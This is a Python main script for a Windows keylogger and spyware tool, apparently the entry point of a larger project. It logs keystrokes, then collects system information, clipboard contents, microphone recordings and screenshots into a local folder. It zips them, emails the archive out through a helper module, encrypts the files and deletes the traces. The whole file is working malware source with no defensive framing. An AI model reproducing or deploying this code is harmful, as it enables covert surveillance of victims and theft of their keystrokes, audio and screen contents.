from sysinfo import computer_information  # Import the function to retrieve system information
from clipboard import copy_clipboard  # Import the function to copy clipboard contents
from keystroke import log_keystrokes  # Import the function to log keystrokes
from microphone import record_microphone  # Import the function to record microphone input
from screenshot import capture_screenshot  # Import the function to capture screenshots
from sendmail import send_email  # Import the function to send emails
from encryption import encrypt_files  # Import the encryption function
import os
import shutil
import zipfile
from pynput.keyboard import Key, Listener  # Import classes for handling keyboard events
import win32gui
import win32clipboard
from threading import Lock  # Import the Lock class for thread synchronization

# Define the file path (relative path)
file_path = ".\\Keylogger"

# Create the directory if it doesn't exist
if not os.path.exists(file_path):
    os.makedirs(file_path)

# Create a lock to synchronize printing the message
message_lock = Lock()

def zip_files():
    # Define the files to be zipped
    files_to_zip = [
        os.path.join(file_path, "f_keystroke.txt"),
        os.path.join(file_path, "f_website.log"),
        os.path.join(file_path, "f_sysinfo.txt"),
        os.path.join(file_path, "f_clipboard.txt"),
        os.path.join(file_path, "f_microphone.wav"),
        os.path.join(file_path, "f_screenshot.png")
    ]

    # Create a zip file
    with zipfile.ZipFile(os.path.join(file_path, "f_logs.zip"), "w") as zipf:
        for file in files_to_zip:
            if os.path.exists(file):
                zipf.write(file)
                print(f"Added file to zip: {file}")
            else:
                print(f"File not found: {file}")

def cleanup():
    # Define the normal files to be deleted
    files_to_delete = [
        os.path.join(file_path, "f_keystroke.txt"),
        os.path.join(file_path, "f_website.log"),
        os.path.join(file_path, "f_sysinfo.txt"),
        os.path.join(file_path, "f_clipboard.txt"),
        os.path.join(file_path, "f_microphone.wav"),
        os.path.join(file_path, "f_screenshot.png"),
        os.path.join(file_path, "f_logs.zip")  # Add the zip file to be deleted
    ]

    # Delete the normal files
    for file in files_to_delete:
        if os.path.exists(file):
            os.remove(file)
            print(f"Deleted file: {file}")
        else:
            print(f"File not found: {file}")

    """Optionally, delete the entire directory
    if os.path.exists(file_path):
        shutil.rmtree(file_path)
        print(f"Deleted directory: {file_path}")
    else:
        print(f"Directory not found: {file_path}")"""

def main():

    # Perform keylogger initialization and setup here

    def on_press(key):
        # Handle key press events
        log_keystrokes(file_path, key)
        # Add any additional key press handling logic here

    def on_release(key):
        # Handle key release events
        if key == Key.esc:
            # Acquire the lock to print the message
            with message_lock:
                print("Keystrokes logging completed.")
            return False
        # Add any additional key release handling logic here

    # Start the keylogger
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


        # Retrieve system information
        computer_information(file_path)
        print("System information retrieved.")

        # Copy clipboard contents
        copy_clipboard(file_path)
        print("Clipboard contents copied.")

        # Record microphone
        record_microphone(file_path)
        print("Microphone recorded.")

        # Capture screenshot
        capture_screenshot(file_path)
        print("Screenshot captured.")

        # Zip the files
        zip_filename = os.path.join(file_path, "f_logs.zip")
        zip_files()
        print("Files zipped.")

        # Send email with the zipped file
        send_email(zip_filename)
        print("Email sent with zipped file.")

        # Encrypt the files
        encrypt_files(file_path)
        print("Files encrypted.")

        # Cleanup normal files
        cleanup()
        print("Cleanup completed.")

        # Acquire the lock to print the message
        with message_lock:
            print("Keystrokes logging completed.")

        # Prompt the user to input any key before exiting
        input("Press any key to exit...")


if __name__ == "__main__":
    main()

